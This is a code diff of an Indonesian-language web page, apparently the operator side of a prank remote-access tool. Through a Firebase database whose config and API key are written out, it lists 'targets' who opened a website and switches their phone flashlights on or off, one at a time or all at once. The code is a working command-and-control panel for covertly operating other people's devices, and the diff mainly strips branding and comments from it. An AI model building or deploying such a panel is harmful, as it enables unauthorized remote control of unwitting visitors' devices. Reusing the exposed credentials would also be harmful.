@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Senter Controller😈</title>
+    <title>Remote Senter Controller</title>
+    <link rel="manifest" href="/manifest.json">
+    
     <style>
         * {
             margin: 0;
@@ -26,11 +28,6 @@
             border-bottom: 2px solid #00ff00;
             padding-bottom: 10px;
             font-size: 24px;
-        }
-        h1 span {
-            color: #ff0000;
-            font-size: 14px;
-            display: block;
         }
         .stats {
             background: #111;
@@ -91,9 +88,6 @@
             font-weight: bold;
             font-size: 16px;
             cursor: pointer;
-        }
-        .target-id:hover {
-            text-decoration: underline;
         }
         .target-time {
             color: #ffff00;
@@ -159,7 +153,6 @@
         }
     </style>
     
-    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
@@ -167,48 +160,45 @@
     <div class="container">
         <h1>
             🔦 REMOTE SENTER CONTROLLER
-            <span>© Architect 02 - RianModss</span>
+            <span>© Architect 02</span>
         </h1>
         
-        <div class="stats" id="stats">
+        <div class="stats">
             📊 Target Online: <span id="onlineCount">0</span>
         </div>
         
         <div class="manual-control">
-            <h3>🎮 KONTROL MANUAL (LANGSUNG)</h3>
-            <input type="text" id="manualTargetId" placeholder="Masukkan ID Target (cth: target_abc123)">
+            <h3>🎮 KONTROL MANUAL</h3>
+            <input type="text" id="manualTargetId" placeholder="Masukkan ID Target">
             <div>
                 <button onclick="manualControl('on')">🔦 NYALAIN</button>
                 <button class="off" onclick="manualControl('off')">⚫ MATIIN</button>
             </div>
-            <p style="color:#666; font-size:12px; margin-top:10px;">Kalo ga muncul di daftar, pake ini aja</p>
         </div>
         
         <div class="target-list">
-            <h3>🎯 DAFTAR TARGET ONLINE:</h3>
+            <h3>🎯 DAFTAR TARGET:</h3>
             <div id="targets">
-                <p style="color: #666; text-align: center;">Menunggu target buka website...</p>
+                <p style="color: #666;">Menunggu target...</p>
             </div>
         </div>
         
         <div class="broadcast">
-            <h3>📢 BROADCAST KE SEMUA</h3>
+            <h3>📢 BROADCAST</h3>
             <button class="broadcast-btn" onclick="broadcastTorch('on')">
-                🔦 NYALAIN SENTER SEMUA
+                🔦 NYALAIN SEMUA
             </button>
             <button class="broadcast-btn" style="background:#ff0000;" onclick="broadcastTorch('off')">
-                ⚫ MATIIN SENTER SEMUA
+                ⚫ MATIIN SEMUA
             </button>
         </div>
         
         <div class="footer">
-            ⚡ REAL-TIME CONTROL VIA FIREBASE<br>
-            Klik ID target buat auto-fill ke input manual
+            ⚡ REAL-TIME CONTROL
         </div>
     </div>
 
     <script>
-        // ========== GANTI DENGAN CONFIG FIREBASE LU (SAMA PERSIS) ==========
         const firebaseConfig = {
             apiKey: "AIzaSyCoC-uCqyiuE_jrJlVbRXrqlNsqiRrTLHU",
             authDomain: "otrat-27a09.firebaseapp.com",
@@ -219,21 +209,18 @@
             appId: "1:414699965939:web:8625a69791a8d839021686"
         };
         
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
-        // Referensi ke semua target
         const targetsRef = database.ref('targets');
         
-        // Update tampilan ketika ada perubahan
         targetsRef.on('value', (snapshot) => {
             const targets = snapshot.val();
             const targetsDiv = document.getElementById('targets');
             const onlineCount = document.getElementById('onlineCount');
             
             if (!targets) {
-                targetsDiv.innerHTML = '<p style="color: #666; text-align: center;">Belum ada target...</p>';
+                targetsDiv.innerHTML = '<p style="color: #666;">Belum ada target...</p>';
                 onlineCount.innerText = '0';
                 return;
             }
@@ -242,15 +229,13 @@
             let online = 0;
             const now = Date.now();
             
-            // Loop setiap target
             Object.keys(targets).forEach(key => {
                 const target = targets[key];
                 const lastSeen = target.lastSeen || target.timestamp || 0;
-                const isOnline = (now - lastSeen) < 70000; // 70 detik
-            
+                const isOnline = (now - lastSeen) < 120000;
+                
                 if (isOnline) online++;
                 
-                const flashlightStatus = target.flashlight === 'on' ? 'ON' : 'OFF';
                 const statusClass = target.flashlight === 'on' ? 'status-on' : 'status-off';
                 
                 html += `
@@ -262,7 +247,7 @@
                         </div>
                         <div>
                             <span class="flash-status ${statusClass}">
-                                🔦 SENTER: ${flashlightStatus}
+                                🔦 SENTER: ${target.flashlight || 'OFF'}
                             </span>
                         </div>
                         <div class="controls">
@@ -277,7 +262,6 @@
             onlineCount.innerText = online;
         });
         
-        // Fungsi kirim command ke target tertentu
         function sendCommand(targetId, state) {
             database.ref('commands/' + targetId).set({
                 torch: state,
@@ -286,42 +270,30 @@
             alert('✅ Command dikirim ke ' + targetId);
         }
         
-        // Fungsi kontrol manual (langsung input ID)
         function manualControl(state) {
             const targetId = document.getElementById('manualTargetId').value.trim();
             if (!targetId) {
-                alert('❌ Masukkan ID target dulu, kontol!');
+                alert('❌ Masukkan ID target!');
                 return;
             }
-            database.ref('commands/' + targetId).set({
-                torch: state,
-                timestamp: Date.now()
-            });
-            alert('✅ Command dikirim ke ' + targetId);
+            sendCommand(targetId, state);
         }
         
-        // Fungsi buat auto-fill ID ke input manual
         function fillTargetId(id) {
             document.getElementById('manualTargetId').value = id;
         }
         
-        // Fungsi broadcast ke semua target online
         function broadcastTorch(state) {
             if (!confirm(`Yakin mau ${state === 'on' ? 'NYALAIN' : 'MATIIN'} SEMUA target?`)) return;
             
             targetsRef.once('value', (snapshot) => {
                 const targets = snapshot.val();
-                if (!targets) {
-                    alert('❌ Ga ada target!');
-                    return;
-                }
-                
                 let count = 0;
                 const now = Date.now();
                 
                 Object.keys(targets).forEach(key => {
                     const lastSeen = targets[key].lastSeen || targets[key].timestamp || 0;
-                    if ((now - lastSeen) < 70000) { // Online dalam 70 detik
+                    if ((now - lastSeen) < 120000) {
                         database.ref('commands/' + key).set({
                             torch: state,
                             timestamp: now
@@ -330,14 +302,9 @@
                     }
                 });
                 
-                alert(`✅ Broadcast ke ${count} target: SENTER ${state.toUpperCase()}`);
+                alert(`✅ Broadcast ke ${count} target`);
             });
         }
-        
-        // Auto-refresh setiap 5 detik
-        setInterval(() => {
-            // Ga usah ngapa-ngapain, Firebase udah realtime
-        }, 5000);
     </script>
 </body>
 </html>
